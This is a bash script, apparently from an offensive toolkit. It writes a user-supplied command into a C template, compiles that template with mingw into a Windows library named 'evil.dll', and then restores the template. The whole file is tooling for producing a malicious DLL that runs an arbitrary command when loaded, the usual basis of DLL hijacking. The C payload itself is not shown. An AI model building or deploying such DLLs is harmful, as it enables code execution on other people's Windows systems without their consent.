#!/bin/bash

# Constant for colorfull strings
RED='\033[0;31m'
NC='\033[0m' # No Color

if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi


#check if required compile package installed
REQUIRED_PKG="mingw-w64"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG|grep "install ok installed")
echo "Checking for $REQUIRED_PKG: $PKG_OK"
if [ "" = "$PKG_OK" ]; then
  echo "No $REQUIRED_PKG. Setting up $REQUIRED_PKG."
  sudo apt-get --yes install $REQUIRED_PKG
fi


while getopts ":c:" opt; do
  case $opt in

    c) arg_command="$OPTARG"
    ;;
    \?) echo "Invalid option -$OPTARG" >&2
    ;;
  esac
done

if [[ $# -ne 2 ]]; then
    echo "Illegal number of parameters." 
    echo "You need to either give me command"
    echo "usage : sudo $0 [-c <command>]"
    exit
fi

echo -e "${RED} Generating DLL hold on!!${NC}"
#replace part of dll code
#command_to_execute in dll_generator
replace "command_to_execute" "$arg_command" -- dll_generator.c

#generate dll
i686-w64-mingw32-gcc -shared dll_generator.c -o evil.dll

echo -e "${RED}i will repair generator now!!${NC}"

#repair dll_generator
replace  "$arg_command" "command_to_execute" -- dll_generator.c

